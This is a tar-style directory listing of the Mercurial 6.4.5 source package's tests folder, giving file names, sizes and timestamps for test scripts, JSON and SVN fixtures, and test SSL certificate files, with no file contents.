--rw-r--r--   0 alphare   (1000) alphare   (1000)   205871 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabread-4480.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2644 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabread-conduit-error.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3689 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabread-empty-drev.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)   229411 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabread-multi-drev.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)   121698 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabread-str-time.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27576 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-add-parent-setup.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    49804 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-add-parent.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)   152473 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-binary-renames.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    84767 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-binary.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27924 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-comment-created.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26060 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-comment-updated.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27824 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-create-alpha.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    44412 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-create-public.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    50737 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-extend-end.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    57601 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-extend-front.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55187 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-fold-end.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30330 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-immutable.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36865 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-initial.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    37814 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-no-changes.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55587 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-split-end.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    42002 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-fold-updated.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    50297 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-hash-fixes.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    57999 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-no-restack-orphan.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9076 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-skipped.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    48342 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabsend-update-alpha-create-beta.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8414 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabupdate-change-6876.json
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11184 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/phabricator/phabupdate-revs.json
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1939 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/printenv.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1443 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/printrevset.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1472 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/pullext.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      270 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/readlink.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      666 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/remotefilelog-getflogheads.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1108 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/remotefilelog-library.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1999 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/revlog-formatv0.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      537 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/revnamesext.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)   142061 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/run-tests.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      667 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/seq.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      681 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/silenttestrunner.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20194 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/simplestorerepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      418 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sitecustomize.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3606 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sshprotoext.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.440352 mercurial-6.4.5/tests/sslcerts/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1824 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/README
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1025 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/client-cert.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1679 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/client-key-decrypted.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1766 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/client-key.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1679 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/priv.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/pub-expired.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/pub-not-yet.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/pub-other.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/sslcerts/pub.pem
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.444352 mercurial-6.4.5/tests/svn/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5686 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/branches.svndump
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1556 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/empty.svndump
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3506 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/encoding.svndump
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7715 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/move.svndump
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5119 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/replace.svndump
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2863 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/startrev.svndump
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1489 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-branches.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      866 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-empty.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1055 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-encoding.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2316 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-move.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1496 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-replace.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      732 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-startrev.sh
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1196 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/svndump-tags.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4518 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn/tags.svndump
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      641 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svn-safe-append.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      312 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svnurlof.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1852 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/svnxml.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      873 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-abort-checkin.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      996 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb-edit-lines.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6634 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb-filefixupstate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      389 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb-phase.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5855 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb-rename.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      662 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb-strip.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      797 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb-unfinished.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14017 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-absorb.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    86954 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-acl.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6650 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-add.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3884 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-addremove-similar.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1870 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-addremove.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18133 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-alias.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3679 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-amend-subrepo.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17931 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-amend.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13052 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ancestor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1412 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-ancestor.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3805 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-annotate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23421 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-annotate.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2610 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-arbitraryfilectx.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      665 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-archive-symlinks.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20069 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-archive.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4259 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-atomictempfile.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5098 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-audit-path.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16196 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-audit-subrepo.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7137 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-automv.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18446 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-backout.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-backwards-remove.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7260 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bad-extension.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      316 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bad-pull.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5569 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-basic.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6140 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-batching.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      360 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-batching.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5634 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bdiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8275 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bheads.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23161 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bisect.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20453 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bisect2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6194 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bisect3.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18633 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-blackbox.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8063 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookflow.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6580 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks-corner-case.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5516 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks-current.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4267 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks-merge.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    44556 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks-pushpull.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2533 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks-rebase.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1007 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks-strip.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    35122 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bookmarks.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10152 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-branch-change.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3189 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-branch-option.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1612 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-branch-tag-confict.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    44923 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-branches.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3274 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bugzilla.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8967 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle-phases.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7443 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle-r.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7084 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle-type.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2443 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle-vs-outgoing.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31696 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43152 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle2-exchange.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    54392 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle2-format.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14608 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle2-multiple-changegroups.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2709 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle2-pushback.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20851 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-bundle2-remote-changegroup.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5637 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-byteify-strings.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2625 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-cache-abuse.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2586 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-cappedreader.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6940 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-casecollision-merge.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1317 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-casecollision.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4774 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-casefolding.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2137 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-cat.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    41647 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-cbor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15868 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-censor.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      553 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-censor2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1090 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-changelog-exec.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      353 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-cargo-lock.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      344 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-clang-format.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3619 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-code.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      808 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-commit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1527 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-config.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      819 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-encoding.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      630 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-execute.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      282 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-format.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      930 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-help.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7070 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-interfaces.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      129 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-interfaces.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)      250 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-jshint.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1628 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-module-imports.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1341 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-py3-compat.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1357 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-pyflakes.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      672 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-pylint.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      333 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-rust-format.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      868 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-check-shbang.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15862 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-chg.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3023 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-children.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6254 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-churn.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1165 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone-cgi.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1110 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone-pull-corruption.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5762 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone-r.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11689 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone-stream-format.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28239 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone-stream.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3510 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone-update-order.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    34101 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clone.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28147 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-clonebundles.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1903 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-close-head.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    37292 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commandserver.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    34068 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commit-amend.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9765 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commit-interactive-curses.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    41248 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commit-interactive.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3748 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commit-multiple.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3706 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commit-unresolved.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21377 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-commit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2582 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-committer.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11778 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-completion.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1289 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-config-env.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      126 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-config-env.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1847 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-config-parselist.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12114 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-config.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8500 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-conflict.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1247 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-confused-revert.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1662 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-context-metadata.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6542 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-context.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3689 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-context.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10068 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-check-code.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5067 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-check-commit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1954 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-dumprevlog.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      272 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-emacs.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13527 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-perf.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2778 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-pull-logger.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16331 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-relnotes.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4603 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib-testparseutil.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3874 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-contrib.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1240 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-authormap.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5379 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-baz.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      909 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-bzr-114.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4434 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-bzr-directories.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1056 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-bzr-ghosts.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7907 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-bzr-merges.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      829 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-bzr-treeroot.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6769 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-convert-bzr.t
